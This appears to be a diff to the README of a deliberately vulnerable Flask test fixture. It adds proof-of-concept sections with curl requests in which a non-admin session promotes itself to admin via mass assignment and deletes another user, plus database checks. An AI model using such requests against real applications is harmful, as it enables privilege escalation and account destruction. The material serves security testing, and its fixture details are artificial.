@@ -5,12 +5,13 @@ vulnerable fixture. The payloads were verified against this fixture on
 2026-08-17 and write only disposable marker files under `/tmp` in the app
 container.
 
-This fixture is based on the Flask Bones web application and covers eight
+This fixture is based on the Flask Bones web application and covers ten
 attacker-reachable flows: two open redirects, two command injections, two
-unsafe deserializations, and two path traversals. The local Compose stack
-starts the Flask app and RQ worker, MailHog on port 8025, PostgreSQL, Redis,
-and Memcached. The worker must be running before retrieving the verification
-email in the second open-redirect POC.
+unsafe deserializations, two path traversals, mass assignment, and arbitrary
+user deletion. The local Compose stack starts the Flask app and RQ worker,
+MailHog on port 8025, PostgreSQL, Redis, and Memcached. The worker must be
+running before retrieving the verification email in the second open-redirect
+POC.
 
 All requests use `Host: app.docker:5000` because `SERVER_NAME` is pinned to
 that value in `app/config.py`. Requests with a different host can return 404
@@ -204,6 +205,59 @@ Both requests succeed for the non-admin account. The investigation route can
 be exercised the same way with `POST /user/investigate/1`. An unauthenticated
 request to `/user/diagnostics` returns 401, so the attacker model is any user
 who can self-register rather than an administrator.
+
+## Mass assignment — promote a low-privilege account
+
+The edit route accepts `is_admin` and `active` from the request, then applies
+them to the user selected by the URL without checking whether the requester
+may edit that record. In the fresh database created above, `redirpoc` is user
+ID 5 (the seeded administrator and three fake users occupy IDs 1–4). Reuse
+the non-admin `user-cookies.txt` session from the preceding section:
+
+```sh
+curl -sS -i -H "Host: app.docker:5000" -b user-cookies.txt -X POST \
+  http://localhost:5000/user/edit/5 \
+  -d "username=redirpoc&email=redirpoc@example.com&is_admin=y&active=y" \
+  | grep -i "^HTTP"
+
+docker-compose exec app python -c "
+from serve import app
+from app.user.models import User
+app.app_context().push()
+print(User.query.filter_by(username='redirpoc').first().is_admin)
+"
+```
+
+Expected result: the POST returns `200 OK` and the database query prints
+`True`. The same endpoint accepts any numeric user ID, so the authenticated
+attacker can also modify another user's editable fields. In this fixture,
+`is_admin` primarily controls UI visibility; the security defect is the
+unauthorized persistence of security-sensitive fields, not an assumption that
+the flag unlocks every server endpoint.
+
+## Missing access control — delete another user
+
+The deletion route also checks only that a user is logged in. Delete one of
+the disposable seeded accounts using the same low-privilege session:
+
+```sh
+curl -sS -i -H "Host: app.docker:5000" -b user-cookies.txt \
+  http://localhost:5000/user/delete/1 \
+  | grep -i "^HTTP\|^Location"
+
+docker-compose exec app python -c "
+from serve import app
+from app.user.models import User
+app.app_context().push()
+print(User.query.get(1) is None)
+"
+```
+
+Expected result: the request returns `302 FOUND` and the database query prints
+`True`, demonstrating that a self-registered, non-admin account can delete an
+unrelated account. The endpoint mutates state through `GET`, which also makes
+it susceptible to cross-site request triggering; the demonstrated issue does
+not rely on that additional weakness.
 
 ## Clean up
 
